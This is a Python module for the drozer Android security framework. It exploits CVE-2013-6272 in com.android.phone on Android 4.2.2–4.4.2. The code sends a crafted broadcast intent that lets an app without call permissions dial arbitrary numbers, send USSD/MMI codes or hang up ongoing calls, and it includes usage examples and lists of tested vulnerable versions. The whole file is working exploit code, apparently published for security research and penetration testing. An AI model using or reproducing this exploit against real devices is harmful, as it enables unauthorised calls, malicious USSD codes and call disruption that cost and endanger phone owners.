from drozer import android
from drozer.modules import common, Module

class callme1(Module):

    name = "Exploit CVE-2013-6272 to initiate or kill phone calls."
    description = """
    This plugin abuses a bug which allows a malicious app/user to use the com.android.phone without the necessary permissions.

    CVE-2013-6272

    http://www.curesec.com
    by Curesec Research Team security@curesec.com

    Tested to be VULN:
    4.2.2
    4.3
    4.4.2

    Tested NOT VULN:
    4.0.3
    4.1.1
    4.1.2

    """
    examples = """
    dz> run exploit.badauth.callme -t 1234567890
    dz> run exploit.badauth.callme -c *%2343%23
    dz> run exploit.badauth.callme -k
    """
    author = "security@curesec.com"
    date = "2014-06-25"
    license = "BSD (3-clause)"
    path = ["exploit", "badauth"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def add_arguments(self, parser):
        parser.add_argument("-t", "--telephone",  default=None, help="specify the number to call")
        parser.add_argument("-c", "--code", default=None, help="USSD/MMI code, Attention! Use (percentage char)23 for encoded #")
        parser.add_argument("-k", "--kill", action="store_true",default=None, help="Kill/Hangup ongoin call")

    def execute(self, arguments):

        if arguments.code != None and arguments.telephone != None and arguments.kill!= None:
            self.stderr.write("Please specify only -t, -c or -k not all\n")
            arguments.print_help()
            return 

        if arguments.code == None and arguments.telephone == None and arguments.kill == None:
            self.stderr.write("Please specify -t, -c or -k\n")
            return

        self.stdout.write("[+] Exploiting CVE-2013-6272\n")

        if arguments.telephone != None:
            #set action as CALL
            act = "com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION"

            #add the prefix
            data = "tel:%s" % arguments.telephone
            self.stdout.write("[+] Dialing: %s\n" % arguments.telephone)

        elif arguments.code != None:
            #set action as CALL
            act = "com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION"

            #add the prefix
            data = "tel:%s" % arguments.code
            self.stdout.write("[+] Sending code: %s\n" % arguments.code)

        elif arguments.kill == True:
            act = "com.android.phone.ACTION_HANG_UP_ONGOING_CALL"
            data = None
            self.stdout.write("[+] Killing ongoing call\n")

        else:
            self.stdout.write("[-] Something went wrong.\n")
            return

        #build the intent
        intent = android.Intent(action=act, data_uri=data, component=['com.android.phone','com.android.phone.PhoneGlobals$NotificationBroadcastReceiver'])

        if intent.isValid():
            self.getContext().sendBroadcast(intent.buildIn(self))
        else:
            self.stderr.write("[-] Invalid!\n")
